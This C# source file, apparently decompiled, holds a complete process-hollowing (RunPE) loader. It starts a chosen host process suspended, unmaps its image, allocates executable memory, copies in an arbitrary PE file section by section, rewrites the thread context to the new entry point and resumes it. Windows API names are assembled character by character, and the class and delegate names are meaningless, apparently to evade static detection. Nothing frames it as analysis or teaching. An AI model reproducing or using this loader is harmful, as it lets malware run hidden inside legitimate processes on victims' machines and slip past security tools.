using System;
using System.Runtime.InteropServices;
using System.Text;

public class IX
{
	private delegate bool ESS(string appName, StringBuilder commandLine, IntPtr procAttr, IntPtr thrAttr, [MarshalAs(UnmanagedType.Bool)] bool inherit, int creation, IntPtr env, string curDir, byte[] sInfo, IntPtr[] pInfo);

	private delegate bool EXT(IntPtr hThr, uint[] ctxt);

	private delegate bool TEX(IntPtr t, uint[] c);

	private delegate uint ION(IntPtr hProc, IntPtr baseAddr);

	private delegate bool ORY(IntPtr hProc, IntPtr baseAddr, ref IntPtr bufr, int bufrSize, ref IntPtr numRead);

	private delegate uint EAD(IntPtr hThread);

	private delegate IntPtr CEX(IntPtr hProc, IntPtr addr, IntPtr size, int allocType, int prot);

	private delegate bool CTEX(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, ref uint lpflOldProtect);

	private delegate bool MOR(IntPtr hProcess, IntPtr naddr, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

	private delegate bool OP(byte[] bytes, string surrogateProcess);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	internal static extern IntPtr LoadLibraryA([In][MarshalAs(UnmanagedType.LPStr)] string lpFileName);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	public T CreateAPI<T>(string name, string method)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(name), method), typeof(T));
	}

	public static bool AA(byte[] bytes, string surrogateProcess)
	{
		IX @object = new IX();
		OP oP = @object.Q;
		oP(bytes, surrogateProcess);
		return true;
	}

	public bool Q(byte[] bytes, string surrogateProcess)
	{
		ESS eSS = CreateAPI<ESS>("kernel32", Convert.ToString('C') + 'r' + 'e' + 'a' + 't' + 'e' + 'P' + 'r' + 'o' + 'c' + 'e' + 's' + 's' + 'A');
		ION iON = CreateAPI<ION>("ntdll", Convert.ToString('N') + 't' + 'U' + 'n' + 'm' + 'a' + 'p' + 'V' + 'i' + 'e' + 'w' + 'O' + 'f' + 'S' + 'e' + 'c' + 't' + 'i' + 'o' + 'n');
		EXT eXT = CreateAPI<EXT>("kernel32", Convert.ToString('G') + 'e' + 't' + 'T' + 'h' + 'r' + 'e' + 'a' + 'd' + 'C' + 'o' + 'n' + 't' + 'e' + 'x' + 't');
		TEX tEX = CreateAPI<TEX>("kernel32", Convert.ToString('S') + 'e' + 't' + 'T' + 'h' + 'r' + 'e' + 'a' + 'd' + 'C' + 'o' + 'n' + 't' + 'e' + 'x' + 't');
		ORY oRY = CreateAPI<ORY>("kernel32", Convert.ToString('R') + 'e' + 'a' + 'd' + 'P' + 'r' + 'o' + 'c' + 'e' + 's' + 's' + 'M' + 'e' + 'm' + 'o' + 'r' + 'y');
		EAD eAD = CreateAPI<EAD>("kernel32", Convert.ToString('R') + 'e' + 's' + 'u' + 'm' + 'e' + 'T' + 'h' + 'r' + 'e' + 'a' + 'd');
		CEX cEX = CreateAPI<CEX>("kernel32", Convert.ToString('V') + 'i' + 'r' + 't' + 'u' + 'a' + 'l' + 'A' + 'l' + 'l' + 'o' + 'c' + 'E' + 'x');
		CreateAPI<CTEX>("kernel32", Convert.ToString('V') + 'i' + 'r' + 't' + 'u' + 'a' + 'l' + 'P' + 'r' + 'o' + 't' + 'e' + 'c' + 't' + 'E' + 'x');
		MOR mOR = CreateAPI<MOR>("kernel32", Convert.ToString('W') + 'r' + 'i' + 't' + 'e' + 'P' + 'r' + 'o' + 'c' + 'e' + 's' + 's' + 'M' + 'e' + 'm' + 'o' + 'r' + 'y');
		try
		{
			IntPtr zero = IntPtr.Zero;
			IntPtr[] array = new IntPtr[4];
			byte[] sInfo = new byte[68];
			int num = BitConverter.ToInt32(bytes, 60);
			int num2 = BitConverter.ToInt16(bytes, num + 6);
			IntPtr intPtr = new IntPtr(BitConverter.ToInt32(bytes, num + 84));
			if (eSS(null, new StringBuilder(surrogateProcess), zero, zero, inherit: false, 4, zero, null, sInfo, array))
			{
				uint[] array2 = new uint[179];
				array2[0] = 65538u;
				if (eXT(array[1], array2))
				{
					IntPtr baseAddr = new IntPtr((long)array2[41] + 8L);
					IntPtr bufr = IntPtr.Zero;
					IntPtr intPtr2 = new IntPtr(4);
					IntPtr numRead = IntPtr.Zero;
					if (oRY(array[0], baseAddr, ref bufr, (int)intPtr2, ref numRead) && iON(array[0], bufr) == 0)
					{
						IntPtr naddr = cEX(addr: new IntPtr(BitConverter.ToInt32(bytes, num + 52)), size: new IntPtr((int)BitConverter.ToUInt32(bytes, num + 80)), hProc: array[0], allocType: 12288, prot: 64);
						mOR(array[0], naddr, bytes, (uint)(int)intPtr, out var lpNumberOfBytesWritten);
						int num3 = num2 - 1;
						IntPtr intPtr3;
						for (int i = 0; i <= num3; i++)
						{
							int[] array3 = new int[10];
							Buffer.BlockCopy(bytes, num + 248 + i * 40, array3, 0, 40);
							byte[] array4 = new byte[array3[4] - 1 + 1];
							Buffer.BlockCopy(bytes, array3[5], array4, Convert.ToInt32(null, 2), array4.Length);
							intPtr3 = new IntPtr(array4.Length);
							mOR(naddr: new IntPtr(naddr.ToInt32() + array3[3]), hProcess: array[0], lpBuffer: array4, nSize: (uint)(int)intPtr3, lpNumberOfBytesWritten: out lpNumberOfBytesWritten);
						}
						IntPtr naddr3 = new IntPtr((long)array2[41] + 8L);
						intPtr3 = new IntPtr(4);
						int value = naddr.ToInt32();
						byte[] bytes2 = BitConverter.GetBytes(Convert.ToUInt32(value));
						intPtr3.ToInt64();
						mOR(array[0], naddr3, bytes2, 0u, out lpNumberOfBytesWritten);
						array2[44] = (uint)(naddr.ToInt32() + BitConverter.ToInt32(bytes, num + 40));
						tEX(array[1], array2);
					}
				}
				eAD(array[1]);
			}
		}
		catch
		{
			return false;
		}
		return true;
	}
}
